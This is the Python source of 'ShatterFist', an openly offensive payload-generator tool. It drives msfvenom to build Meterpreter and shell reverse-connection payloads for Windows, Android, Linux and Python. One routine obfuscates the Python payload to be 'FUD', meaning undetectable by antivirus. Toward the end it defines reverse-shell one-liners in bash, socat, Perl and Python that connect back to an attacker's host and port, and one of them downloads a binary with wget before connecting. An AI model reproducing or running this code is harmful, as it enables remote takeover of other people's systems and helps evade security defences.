#!/usr/bin/env python3
import colorama
import subprocess
import sys
import re 
import base64
import random
import string 
import time


# Dev: SlickPunk666 (slick-punk)
# Maintainer: SlickPunk666 (slick-punk)
# Helped By: SlickPunk666 (slick-punk)
# Bug Fixer: SlickPunk666 (slick-punk)
banner= ('''
@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
@@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
!@@       @@!  @@@  @@!  @@@    @@!      @@!    @@!       @@!  @@@  @@!       @@!  !@@         @@!    
!@!       !@!  @!@  !@!  @!@    !@!      !@!    !@!       !@!  @!@  !@!       !@!  !@!         !@!    
!!@@!!    @!@!@!@!  @!@!@!@!    @!!      @!!    @!!!:!    @!@!!@!   @!!!:!    !!@  !!@@!!      @!!    
 !!@!!!   !!!@!!!!  !!!@!!!!    !!!      !!!    !!!!!:    !!@!@!    !!!!!:    !!!   !!@!!!     !!!    
     !:!  !!:  !!!  !!:  !!!    !!:      !!:    !!:       !!: :!!   !!:       !!:       !:!    !!:    
    !:!   :!:  !:!  :!:  !:!    :!:      :!:    :!:       :!:  !:!  :!:       :!:      !:!     :!:    
:::: ::   ::   :::  ::   :::     ::       ::     :: ::::  ::   :::   ::        ::  :::: ::      ::    
:: : :     :   : :   :   : :     :        :     : :: ::    :   : :   :        :    :: : :       :     
                                                                                                      
                                                                                                      
@@@  @@@   @@@@@@                                                                                     
@@@  @@@  @@@@@@@@                                                                                    
@@!  @@@       @@@                                                                                    
!@!  @!@      @!@                                                                                     
@!@  !@!     !!@                                                                                      
!@!  !!!    !!:                                                                                       
:!:  !!:   !:!                                                                                        
 ::!!:!   :!:                                                                                         
  ::::    :: :::::                                                                                    
   :      :: : :::                                                                                    
                                  ''')


banner2 = ''' 
  .dBBBBP   dBP dBP dBBBBBb  dBBBBBBP dBBBBBBP dBBBP dBBBBBb    dBBBBP dBP.dBBBBP dBBBBBBP
  BP                     BB                              dBP              BP              
  `BBBBb  dBBBBBP    dBP BB   dBP      dBP   dBBP    dBBBBK   dBBBP  dBP  `BBBBb   dBP    
     dBP dBP dBP    dBP  BB  dBP      dBP   dBP     dBP  BB  dBP    dBP      dBP  dBP     
dBBBBP' dBP dBP    dBBBBBBB dBP      dBP   dBBBBP  dBP  dB' dBP    dBP  dBBBBP'  dBP      '''   


banner3 = '''
╔═╗┬ ┬┌─┐┌┬┐┌┬┐┌─┐┬─┐╔═╗┬┌─┐┌┬┐
╚═╗├─┤├─┤ │  │ ├┤ ├┬┘╠╣ │└─┐ │ 
╚═╝┴ ┴┴ ┴ ┴  ┴ └─┘┴└─╚  ┴└─┘ ┴ '''

lhost = "localhost"
lport = "4962"
pyoutfile = "pythonpayload"
winoutfile = "windowspayload"
androutfile = "androidpayload"
linuxoutfile = "linuxpayload"
defaultarch = "x86"
talkbackm1 = "tcp"
outfiley="payload.payload"
run = True

def clearscreen():
    if sys.platform == "linux":
        subprocess.run("clear")
    elif sys.platform == "win32":
        subprocess.run("cls", shell=True)

#For printopt func
n = 1
def printopt(texxt):  
    global n
    print(colorama.Fore.BLUE +  "[" +  colorama.Fore.LIGHTWHITE_EX + str(n) + colorama.Fore.BLUE + "] " + colorama.Style.RESET_ALL + colorama.Fore.LIGHTBLUE_EX + texxt + colorama.Style.RESET_ALL)
    n += 1   
def printopt2(opt, texxt):
    print(colorama.Fore.BLUE +  "[" +  colorama.Fore.LIGHTWHITE_EX + str(opt) + colorama.Fore.BLUE + "] " + colorama.Style.RESET_ALL + colorama.Fore.LIGHTBLUE_EX + str(texxt) + colorama.Style.RESET_ALL)
def printbannred(texxt):
    return print(colorama.Fore.LIGHTRED_EX +  "#=====+" + texxt + "+=====#" )

def inputc(texxt):
    print("\n")
    inputcy = input(colorama.Fore.LIGHTYELLOW_EX + str(texxt) + colorama.Fore.GREEN).strip()
    print(colorama.Style.RESET_ALL)  
    return inputcy    

def lask():
    global lhost, lport
    lhostask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX + "(" + lhost + ")" + colorama.Fore.BLUE + " : ")
    lportask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX +  "(" + lport +  ")" + colorama.Fore.BLUE + " : ")
    if lhostask.strip() != '':
        lhost = str(lhostask)
    if lportask.strip() != '':
        lport = str(lportask)    
    print(colorama.Style.RESET_ALL)

def payloadgen1(payload, talkback, lhost, lport, outfile): #Not used as of now
    subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    
def askformat():
    pass

def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
    try:
        subprocess.run(["msfvenom", args1,"-p", payloadandsession, "LHOST=", lhost ,"LPORT=", lport, args2, "-o", outfile], check=True,shell=True)   
    except:
        print(colorama.Fore.LIGHTRED_EX +  "An error has occured! Please read the above output and make sure you entered the options properly!" + colorama.Style.RESET_ALL)
    else: 
        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone!\nSaved as {outfile}\n#====================#\n\n" + colorama.Style.RESET_ALL)  
    finally:
        input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)    

def payloadgen3(payload, outfile, args1, args2):
    global lhost, lport, outfiley
    clearscreen()    
    lask()
    outfiley = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({outfiley}){colorama.Fore.BLUE}: ")
    if outfiley != '':
        outfile = outfiley
    asktb()
    print(f"{colorama.Fore.LIGHTCYAN_EX}Generating {payload} Payload...{colorama.Style.RESET_ALL}")  
    payloadgen2(payload, lhost, lport, outfile, args1, args2)

def msfgen():
    payyload = inputc("Enter Meterpreter payload: ")
    args1 = inputc(f"Enter msfvenom args {colorama.Fore.LIGHTRED_EX}({colorama.Fore.LIGHTYELLOW_EX}msfvenom {colorama.Fore.LIGHTRED_EX}<{colorama.Fore.WHITE}msfvenom args{colorama.Fore.LIGHTRED_EX}>{colorama.Fore.BLUE} <payload> <payload args>{colorama.Fore.LIGHTRED_EX}){colorama.Fore.LIGHTYELLOW_EX}: ")
    args2 = inputc(f"Enter msfvenom args {colorama.Fore.LIGHTRED_EX}({colorama.Fore.LIGHTYELLOW_EX}msfvenom <msfvenom args> <payload> {colorama.Fore.LIGHTRED_EX}<{colorama.Fore.WHITE}payload args{colorama.Fore.LIGHTRED_EX}>{colorama.Fore.BLUE}{colorama.Fore.LIGHTRED_EX}){colorama.Fore.LIGHTYELLOW_EX}: ")
    try:
        subprocess.run(["msfvenom", args1, "-p", payyload, args2], check=True,shell=True)   
    except:
        print(colorama.Fore.LIGHTRED_EX +  "An error has occured! Please read the above output and make sure you entered the options properly!" + colorama.Style.RESET_ALL)
    else: 
        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone!\n#====================#\n\n" + colorama.Style.RESET_ALL)  
    finally:
        input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)

def asktb():
    global n, talkbackm1 
    n = 1 
    printopt("Use reverse_tcp")
    printopt("Use reverse_https")
    talkbackopt = inputc("Option: ").strip()
    if  talkbackopt == "1" or talkbackopt == "tcp":
        talkbackm1 = "tcp"
        print (f"{colorama.Fore.GREEN}Using {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")
    elif talkbackopt == "2" or talkbackopt == "https":
        talkbackm1 = "https"
        print (f"{colorama.Fore.GREEN}Using {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")

    else:
        print (f"{colorama.Fore.GREEN}Defaulting to {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")


def pythonpayload():
    global n, pyoutfile, lhost, lport, talkbackm1 
    n = 1
    clearscreen()
    printbannred("Python Payload Menu")
    printopt("Create a simple python meterpreter payload")
    printopt("Create an obfistucated (FUD) python meterpreter payload")
    printopt2("E","Back to main menu")
    inputpy = inputc("Option: ").strip().lower()
    if inputpy != "1" and inputpy != "2" and inputpy != "e":
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputpy} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        pythonpayload() 
    #generate simple payload    
    if inputpy == "1":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
        payloadgen3(f"python/meterpreter/reverse_{talkbackm1}", pyoutfile, None, None)
        time.sleep(2)
    #PYFUD starts here     
    elif inputpy == "2": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
        payloadgen3(f"python/meterpreter/reverse_{talkbackm1}", pyoutfile + ".tmp", None, None)
        pythonpayloadfud()
    elif inputpy == "e":
        main()    
def pythonpayloadfud():
    print(f"\n{colorama.Style.BRIGHT}Making payload FUD...{colorama.Style.RESET_ALL}")
    with open(pyoutfile + ".tmp", "r") as pytempf:
        dat1 = pytempf.readline()
    #part of file b4 base64 code
    b4b64 = "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('"
    #part of file after
    afb64 = "')[0]))"
    b64pycode = re.search("\('utf-8'\)\('(.+)'\)\[0\]\)", dat1).group(1)

    pycode = base64.b64decode(b64pycode)
    #print(pycode)
    splpycode = pycode.decode().split("\n")
    #print(splpycode)
    pycodeembedlist = []
    for z in splpycode:
        pycodeembedlist.append(z)
        pycodeembedlist.append("\n")
        pycodeembedlist.append( '#' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)))
        pycodeembedlist.append("\n")
    finalcode = ''.join(pycodeembedlist)  
    finalcodeb64  = base64.b64encode(finalcode.encode("utf-8"))
    outpy = (b4b64 + str(finalcodeb64) + afb64)
    with open(pyoutfile, "w") as file:
        file.write(outpy)
    print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)  
    input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)   


def winpayload():                         
    global n, winoutfile, lhost, lport, talkbackm1
    n = 1
    clearscreen()
    printbannred("Windows Payload Menu")
    printopt("Create a simple windows meterpreter payload (tcp)")
    printopt("Create a simple windows meterpreter payload (https)")
    printopt("Create a siple windows shell payload (tcp)")
    printopt("Create a simple windows shell payload (https)")
    printopt2("E","Back to main menu")
    inputwin = inputc("Option: ").strip().lower()
    if inputwin != "1" and inputwin != "2" and inputwin != "e":
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputwin} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        winpayload() 
    lask()
    inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({winoutfile}){colorama.Fore.BLUE}: ")
    #asktb()
    if inputy2.strip() != "":
        winoutfile = inputy2
    #WinMeterpeter    
    if inputwin == "1": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2(f"windows/meterpreter/reverse_tcp", lhost, lport, winoutfile + ".exe",f'-a {defaultarch}','-b "\\x00" -f exe')
    #WinShell    
    elif inputwin == "2":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2("windows/meterpreter/reverse_https", lhost, lport, winoutfile + ".exe",f'-a {defaultarch}','-b "\\x00" -f exe')
    elif inputwin == "3":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2("windows/shell/reverse_tcp", lhost, lport, winoutfile + "exe",f'-a {defaultarch}','-b "\\x00" -f exe')    
    elif inputwin == "4":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2("windows/shell/reverse_https", lhost, lport, winoutfile + "exe",f'-a {defaultarch}','-b "\\x00" -f exe') 
    elif inputwin == "e":
        main()           
    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputwin} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        winpayload()   

def androidpayload():
    global  n, androutfile, lhost, lport, talkbackm1
    n = 1
    clearscreen()
    printbannred("Android Payload Menu")
    printopt("Create a simple Meterpreter payload (tcp)")
    printopt("Create a simple Meterpreter payload (https)")
    printopt2("E","Back to main menu")
    inputy = inputc("Option: ").strip()
    if inputy != "1" and inputy != "2" and inputy != "e":
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        androidpayload() 
    lask()
    inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({winoutfile}){colorama.Fore.BLUE}: ").strip()
    #asktb()
    if inputy2 != "":
        androutfile = inputy2
    if inputy == "1": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2(f"android/meterpreter/reverse_tcp", lhost, lport, androutfile + ".apk", None, None)
    elif inputy == "2": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2(f"android/meterpreter/reverse_https", lhost, lport, androutfile + ".apk", None, None)
    elif inputy == "e":
        main()       
    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        androidpayload()  
    

def linuxpayloadmenu():
    global  n, linuxoutfile, lhost, lport, talkbackm1, defaultarch
    n = 1
    clearscreen()
    printbannred("Linux Payload Menu")
    printopt("Create a simple Meterpreter elf payload (tcp)")
    printopt("Create a simple Meterpreter bash payload (tcp)")
    printopt("Create a simple Meterpreter sh payload (tcp)")
    printopt2("E","Back to main menu")
    inputy = inputc("Option: ").strip()
    if inputy != "1" and inputy != "2" and inputy != "e":
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        linuxpayloadmenu() 
    lask()
    inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({linuxoutfile}(.elf/sh/etc)){colorama.Fore.BLUE}: ")
    #asktb()
    #ASKARCH
    archy = inputc(f"Enter payload arch (x86/x64). Leave empty for default {colorama.Fore.LIGHTRED_EX}({defaultarch}){colorama.Fore.BLUE}: ").strip()
    if archy !=  "":
        defaultarch = archy    
    if inputy2.strip() != "":
        linuxoutfile = inputy2

    if inputy == "1": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2(f"linux/{defaultarch}/meterpreter/reverse_tcp", lhost, lport, linuxoutfile+".elf", None, '-f elf')
    elif inputy == "2": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2(f"linux/{defaultarch}/meterpreter/reverse_tcp", lhost, lport, linuxoutfile+".sh", None, '-f bash')    
    elif inputy == "3": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2(f"linux/{defaultarch}/meterpreter/reverse_tcp", lhost, lport, linuxoutfile+".sh", None, '-f sh')  
    elif inputy == "e":
        main()       
    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        linuxpayloadmenu()  

def miscmenu():
    global n
    print(colorama.Fore.LIGHTRED_EX + "NOT READY YET!!!" + colorama.Style.RESET_ALL)
    n = 1 
    printopt("")
    time.sleep(2)

def shell():
    clearscreen()
    print(colorama.Style.BRIGHT + "Type list to show all available commands" +colorama.Style.RESET_ALL)
    while True:
        try:
            shinput = input(colorama.Fore.RED + colorama.Fore.LIGHTRED_EX + "sfshell> " + colorama.Style.RESET_ALL).strip()
            #EXIT
            if shinput == "exit":
                break
            #SEARCH
            elif shinput == "search":
                search()
            #SEARCH CLI
            elif shinput.split()[0] == "search":
                for element in shinput.split():
                    if element != "search":
                        search2(element)    
            #HELP    
            elif shinput == "list" or shinput == "help":
                for element in cmdlist:
                    print(colorama.Fore.LIGHTGREEN_EX + element + colorama.Style.RESET_ALL)
            #LIST_PAYLOADS        
            elif shinput == "paylist" or shinput == "list payloads":
                for element in pldlist:
                       print( colorama.Fore.LIGHTMAGENTA_EX + "==>" + colorama.Fore.LIGHTWHITE_EX + element + colorama.Style.RESET_ALL)  
            elif shinput == "msfgen":
                msfgen()              
            #SHELL_EXEC           
            else:
                print(colorama.Fore.BLUE + "[*]Exec " +  colorama.Fore.WHITE + shinput  + "\n" + colorama.Style.RESET_ALL )
                subprocess.run(shinput, shell=True)
        except KeyboardInterrupt:
            print( "\n" + colorama.Fore.BLUE + "[" + colorama.Fore.LIGHTWHITE_EX + "*" + colorama.Fore.BLUE  + "]" + colorama.Fore.LIGHTGREEN_EX + "Recieved INTR call exiting..." )
            time.sleep(0.5) 
            break

def search():
    searchstring =  inputc("Enter search string: ").strip()
    matchingplds = [foundplds for foundplds in pldlist if searchstring in foundplds ]  
    for item in matchingplds:
        print(colorama.Fore.LIGHTRED_EX + "==>" + colorama.Fore.LIGHTWHITE_EX + item + colorama.Style.RESET_ALL)  
    inputc("Press enter to exit search")   

def search2(searchstring):
    matchingplds = [foundplds for foundplds in pldlist if searchstring in foundplds ]  
    for item in matchingplds:
        return print(colorama.Fore.LIGHTRED_EX + "==> " + colorama.Fore.LIGHTWHITE_EX + item + colorama.Style.RESET_ALL)    

def menu():
    global n
    n = 1
    clearscreen()
    print(colorama.Fore.LIGHTRED_EX + colorama.Style.BRIGHT + banner3 +  colorama.Style.RESET_ALL)
    print("Dev:" + colorama.Style.BRIGHT + "SlickPunk (slick-punk)" + colorama.Style.RESET_ALL)
    print(colorama.Style.BRIGHT + "BETA" + colorama.Style.RESET_ALL)
    print("\n")
    printopt("Python payload menu")
    printopt("Windows payload menu")
    printopt("Android payload menu")
    printopt("Linux payload menu")
    #printopt("Miscellaneous payloads")
    printopt2("S", "Search for supported payloads")
    printopt2("A", "Advanced menu shell for access to all supported payloads (recommended) ")
    #printopt2("C", "Custom payload")
    printopt2("M", "Start the Metasploit Framework Console")
    printopt2("E", "Exit ShatterFist")
    print(f"Type {colorama.Style.BRIGHT}Exit {colorama.Style.RESET_ALL} to Exit.")
    input1 = inputc("Option: ").strip().lower()
    if input1 == "1":
        time.sleep(0.1)
        pythonpayload()
        main()

    elif input1 == "2":
        winpayload()
        main()

    elif input1 == "3":
        androidpayload() 
        main()

    elif input1 == "4":
        linuxpayloadmenu()
        main()

    elif input1 == "s" or input1 == "search":
        search()
        main()

    elif input1 == "5":
        miscmenu()
        main()

    elif input1 == "a" or input1 == "advanced" or input1 == "shell":
        shell() 
        main()

    elif input1 == "m" or input1 == "msfconsole":
        clearscreen()
        print(colorama.Fore.LIGHTRED_EX)
        subprocess.run("msfconsole") 
        main()  
    
    elif input1  == "e" or input1 == "exit":
        clearscreen()
        print(colorama.Fore.LIGHTRED_EX)
        bye = "Thanks for using ShatterFist!"

        for letter in bye:
            print(letter,end="", flush=True)
            time.sleep(0.05)    
        print()
        time.sleep(0.1)
        sys.exit()

    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {input1} is not valid" + colorama.Style.RESET_ALL)
        time.sleep(2)
        menu()    

#first main code i didnt put inside a def wrapper lol
#===================
#payload list 
#====================
pldlist = []
pldlist.append("[1] windows/meterpreter/reverse_tcp")
pldlist.append("[2] windows/meterpreter/reverse_https")
pldlist.append("[3] windows/shell/reverse_tcp")
pldlist.append("[4] python/meterpreter/reverse_tcp") 
pldlist.append("[5] python/meterpreter/reverse_https")
pldlist.append("[6] python/shell_reverse_tcp") 
pldlist.append("[7] android/meterpreter/reverse_tcp")
pldlist.append("[8] android/meterpreter/reverse_https")
pldlist.append("[9] linux/x86/meterpreter/reverse_tcp")
pldlist.append("[10] linux/x64/meterpreter/reverse_http")

#========================
#command list 
#========================
cmdlist = []
cmdlist.append("[list] - show this page")
cmdlist.append("[help] - show this page")
cmdlist.append("[clear] - clear screen")
cmdlist.append("[search] -  search for compatible payloads")
cmdlist.append("[msfgen] - generate custom metasploit payload")

#========================
#format list 
#========================
formatlist = []
formatlist.append("[1] asp")
formatlist.append("[2] dll")
formatlist.append("[3] elf")
formatlist.append("[4] exe")
formatlist.append("[5] bin")
formatlist.append("[6] py")
formatlist.append("[7] bash")
formatlist.append("[8] sh")

# Bash Reverse TCP Shell
def bash_tcp_v_string1(lhost, lport):
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
def bash_tcp_v_string2(lhost,lport):
    return f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196"
def bash_tcp_v_string3(lhost, lport):
    return f"/bin/bash -l > /dev/tcp/{lhost}/{lport} 0<&1 2>&1"
def bash_tcp_a_string(lhost, lport):
    None

# Bash Reverse UDP Shell
def bash_udp_v_string(lhost, lport):
    return f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1"
def bash_udp_a_string(lport):
    return f"nc -u -lvp {lport}"

# Socat Reverse TCP
def socat_v_string1(lhost, lport):
    return f"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
def socat_v_string2(lhost, lport):
    return f"wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp{lhost}:{lport}"    
def socat_a_string(lport):
    return  f"socat file:`tty`,raw,echo=0 TCP-L:{lport}"   

# Perl Reverse TCP
def perl_v_string1(lhost, lport):
    #Linux only
    return "perl -e 'use Socket;$i="+ str(lhost) + ";$p=" + str(lport) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
def perl_v_string2(lhost, lport):
    return "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr," + f"{lhost}:{lport}" + ");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"    
def perl_v_string3(lhost, lport):
    return "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr," + f"{lhost}:{lport}" +");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

# Python Reverse TCP 
def python_v_string1(lhost, lport):
    return f"python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(({lhost},int({lport})));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"

def main():
    #there for future stuff
    time.sleep(0.1)
    while run == True:  
        try :
            menu()
        except KeyboardInterrupt: 
            try:
                print("\n" + colorama.Fore.LIGHTGREEN_EX + "Recieved " + colorama.Fore.LIGHTRED_EX + "INTR " + colorama.Fore.LIGHTGREEN_EX + "call. Returning to menu. Type exit to exit or Ctrl + C again to force exit" + colorama.Style.RESET_ALL)
                time.sleep(0.2)
                main()
            except KeyboardInterrupt:
                print("Exiting...")  
                time.sleep(0.1)  
                sys.exit()                
colorama.init()  
main()
                                                     
